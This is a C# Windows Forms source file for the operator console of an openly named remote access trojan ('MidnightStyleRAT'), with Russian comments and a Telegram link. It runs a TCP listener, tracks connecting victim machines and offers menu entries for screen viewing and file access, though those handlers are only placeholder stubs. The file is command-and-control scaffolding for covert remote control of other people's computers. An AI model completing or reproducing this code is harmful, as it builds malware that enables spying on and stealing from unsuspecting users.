﻿using System;
using System.Drawing;
using System.Linq;
using System.Windows.Forms;
using System.Diagnostics;
using Microsoft.VisualBasic;

namespace MidnightStyleRAT
{
    public partial class Form1 : Form
    {
        private TcpServer server;

        private ContextMenuStrip listBoxMenu;
    
        public Form1()
        {
            InitializeComponent();


            listBoxMenu = new ContextMenuStrip();  // Вот эта строка!

            listBoxMenu.Items.Clear();
            listBoxMenu.Items.Add("Просмотр экрана", null, OnViewScreenClick);
            listBoxMenu.Items.Add("Файлы", null, OnFilesClick);
            listBoxMenu.Items.Add("Другие действия", null, OnOtherActionsClick);


            server = new TcpServer();

            server.ServerMessageReceived += (msg) =>
            {
                Invoke(() => textBox3.AppendText("[Сервер] " + msg + Environment.NewLine));
            };

            server.ClientConnected += (client) =>
            {
                this.Invoke(() =>
                {
                    clients.Items.Add(client.ClientId); // ✅ ДОБАВИТЬ клиента при подключении
                    MessageBox.Show($"[Клиент подключилcя] {client.ClientId}{Environment.NewLine}");
                });
            };

            server.ClientDisconnected += (client) =>
            {
                Invoke(() =>
                {
                    clients.Items.Remove(client.ClientId); // ✅ УДАЛИТЬ клиента при отключении
                    textBox3.AppendText($"[Клиент отключился] {client.ClientId}{Environment.NewLine}");
                });
            };


            server.ClientMessageReceived += (client, msg) =>
            {
                this.Invoke(() =>
                {
                    textBox3.AppendText($"[{client.ClientId}] {msg}{Environment.NewLine}");
                });
            };

            server.StartServer(12345);


            ApplyMidnightTheme(this);
        }
       

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            server.StopServer();
            base.OnFormClosing(e);
        }

        private void ApplyMidnightTheme(Control control)
        {
            control.BackColor = Color.FromArgb(30, 30, 30); // Тёмный фон

            foreach (Control child in control.Controls)
            {
                if (child is TabControl tab)
                {
                    tab.DrawMode = TabDrawMode.OwnerDrawFixed;
                    tab.DrawItem += (s, e) => DrawMidnightTabs(tab, e);
                    tab.SelectedIndex = 0;
                    tab.BackColor = Color.FromArgb(30, 30, 30);
                }
                else if (child is Button btn)
                {
                    btn.BackColor = Color.FromArgb(45, 45, 48);
                    btn.ForeColor = Color.White;
                    btn.FlatStyle = FlatStyle.Flat;
                    btn.FlatAppearance.BorderSize = 0;
                    btn.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 120, 215);
                    btn.Font = new Font("Segoe UI", 10, FontStyle.Bold);
                }
                else if (child is TextBox txt)
                {
                    txt.BackColor = Color.FromArgb(45, 45, 48);
                    txt.ForeColor = Color.White;
                    txt.BorderStyle = BorderStyle.FixedSingle;
                    txt.Font = new Font("Consolas", 10);
                }
                else if (child is Label lbl)
                {
                    lbl.ForeColor = Color.White;
                }

                ApplyMidnightTheme(child); // Рекурсия для вложенных контролов
            }
        }

        private void DrawMidnightTabs(TabControl tabControl, DrawItemEventArgs e)
        {
            TabPage tabPage = tabControl.TabPages[e.Index];
            Rectangle tabBounds = tabControl.GetTabRect(e.Index);

            bool isSelected = (e.Index == tabControl.SelectedIndex);
            Color bgColor = isSelected ? Color.FromArgb(45, 45, 48) : Color.FromArgb(30, 30, 30);
            Color textColor = isSelected ? Color.DeepSkyBlue : Color.LightGray;

            using (Brush bgBrush = new SolidBrush(bgColor))
                e.Graphics.FillRectangle(bgBrush, tabBounds);

            using (Brush textBrush = new SolidBrush(textColor))
            using (StringFormat sf = new StringFormat { Alignment = StringAlignment.Center, LineAlignment = StringAlignment.Center })
                e.Graphics.DrawString(tabPage.Text, tabControl.Font, textBrush, tabBounds, sf);
        }

        private void buttonAddHost_Click(object sender, EventArgs e)
        {
          
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start(new ProcessStartInfo("https://t.me/secbybyte") { UseShellExecute = true });
        }

        private void tabPage4_Click(object sender, EventArgs e)
        {

        }

        private void ListBox1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                int index = clients.IndexFromPoint(e.Location);
                if (index != ListBox.NoMatches)
                {
                    clients.SelectedIndex = index;
                    listBoxMenu.Show(clients, e.Location);
                }
            }
        }

        private void OnDeleteClick(object sender, EventArgs e)
        {
            if (clients.SelectedIndex != -1)
                clients.Items.RemoveAt(clients.SelectedIndex);
        }

        private void OnEditClick(object sender, EventArgs e)
        {
            if (clients.SelectedIndex != -1)
            {
                string currentText = clients.SelectedItem.ToString();
                string input = Prompt.ShowDialog("Редактировать элемент:", "Редактирование", currentText);
                if (!string.IsNullOrEmpty(input))
                {
                    clients.Items[clients.SelectedIndex] = input;
                }
            }
        }
        public static class Prompt
        {
            public static string ShowDialog(string text, string caption, string defaultText = "")
            {
                Form prompt = new Form()
                {
                    Width = 400,
                    Height = 150,
                    FormBorderStyle = FormBorderStyle.FixedDialog,
                    Text = caption,
                    StartPosition = FormStartPosition.CenterScreen
                };

                Label textLabel = new Label() { Left = 10, Top = 10, Text = text, AutoSize = true };
                TextBox inputBox = new TextBox() { Left = 10, Top = 40, Width = 360, Text = defaultText };

                Button confirmation = new Button() { Text = "OK", Left = 280, Width = 90, Top = 70, DialogResult = DialogResult.OK };
                confirmation.Click += (sender, e) => { prompt.Close(); };

                prompt.Controls.Add(textLabel);
                prompt.Controls.Add(inputBox);
                prompt.Controls.Add(confirmation);
                prompt.AcceptButton = confirmation;

                return prompt.ShowDialog() == DialogResult.OK ? inputBox.Text : "";
            }
        }

        private void OnViewScreenClick(object sender, EventArgs e)
        {
            if (clients.SelectedItem != null)
            {
                string clientId = clients.SelectedItem.ToString();
                MessageBox.Show($"Просмотр экрана для клиента {clientId}");
                // Тут твоя логика
            }
        }

        private void OnFilesClick(object sender, EventArgs e)
        {
            if (clients.SelectedItem != null)
            {
                string clientId = clients.SelectedItem.ToString();
                MessageBox.Show($"Доступ к файлам клиента {clientId}");
                // Тут твоя логика
            }
        }

        private void OnOtherActionsClick(object sender, EventArgs e)
        {
            if (clients.SelectedItem != null)
            {
                string clientId = clients.SelectedItem.ToString();
                MessageBox.Show($"Другие действия для клиента {clientId}");
                // Тут твоя логика
            }
        }

        private void OnCopyClick(object sender, EventArgs e)
        {
            if (clients.SelectedIndex != -1)
            {
                Clipboard.SetText(clients.SelectedItem.ToString());
                MessageBox.Show("Текст скопирован в буфер обмена");
            }
        }

        private void Invoke(Action action)
        {
            if (this.InvokeRequired)
                base.Invoke(action);
            else
                action();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string host = textBox2.Text.Trim();
            if (!string.IsNullOrWhiteSpace(host))
            {
                // Проверим, есть ли уже такой хост
                var hosts = textBox1.Lines.Select(x => x.Trim()).Where(x => !string.IsNullOrEmpty(x));
                if (!hosts.Contains(host))
                {
                    textBox1.AppendText(host + Environment.NewLine);
                    textBox2.Clear();
                }
                else
                {
                    MessageBox.Show("Этот хост уже добавлен", "Информация", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
            else
            {
                MessageBox.Show("Введите хост", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void tabPage2_Click(object sender, EventArgs e)
        {
            
        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void clients_MouseDown(object sender, MouseEventArgs e)
        {
          
        }



       

        private void textBox3_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void clients_MouseDown_1(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                int index = clients.IndexFromPoint(e.Location);
                if (index != ListBox.NoMatches)
                {
                    clients.SelectedIndex = index;
                    listBoxMenu.Show(clients, e.Location);
                }
            }
        }

        private void clients_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
    }
}
